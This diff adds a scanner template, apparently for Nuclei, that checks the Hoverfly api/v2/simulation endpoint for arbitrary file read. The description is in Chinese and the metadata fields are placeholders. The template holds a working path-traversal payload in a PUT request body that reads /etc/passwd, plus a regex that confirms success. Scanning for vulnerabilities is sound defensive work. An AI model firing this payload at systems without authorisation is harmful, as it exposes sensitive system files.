@@ -1,0 +1,29 @@
+id: Hoverfly-simulation-lfi
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: Hoverfly api/v2/simulation 接口存在任意文件读取漏洞，可能导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - raw:
+      - |-
+        PUT /api/v2/simulation HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 137
+
+        {"data":{"pairs":[{"request":{},"response":{"bodyFile": "../../../../../../../etc/passwd","x":"aaa"}} ]},"meta":{"schemaVersion":"v5.3"}}
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
